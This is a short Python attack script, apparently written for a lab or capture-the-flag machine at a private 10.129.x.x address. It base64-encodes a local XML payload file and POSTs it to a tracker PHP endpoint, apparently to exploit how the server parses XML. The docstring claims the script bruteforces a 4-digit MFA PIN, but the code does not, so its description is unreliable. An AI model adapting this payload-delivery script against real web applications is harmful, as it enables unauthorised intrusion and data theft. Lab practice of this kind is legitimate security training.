"""
This script is for multifactor authentification. 
This script logins in first as user and then bruteforces the 4 digits pin.
"""

#!/usr/bin/env python3
import re
import requests
import sys
import argparse
import base64

#initialisation of variables
host = 'http://10.129.179.150'
get_url = host + '/log_submit.php'
post_url = host + "/tracker_diRbPr00f314.php"
pathToPayload = "/home/kali/hacking/scripts/standalone/sample.xml"


def base64encode(filePath):
    # convert file content to base64 encoded string
    with open(filePath, "rb") as file:
        encoded = base64.encodebytes(file.read()).decode("ISO-8859-1")

        # output base64 content    
        #print("base64 encoded payload: " + encoded)
        return encoded

# Reading input
parser = argparse.ArgumentParser()
parser.add_argument("--url", "-u", help="set target url")
args = parser.parse_args()

# post request
session = requests.Session()
#session.proxies={'http': 'http://localhost:8080'}

#pin = pin.rstrip()
#print('[*] Trying pin: "{p}"'.format(p = pin))
    
page = session.get(get_url)    

dataCorrect = {
    'data': base64encode(pathToPayload)
}
    
post_request = session.post(post_url, data = dataCorrect, allow_redirects = True)
print("response: " + post_request.text) 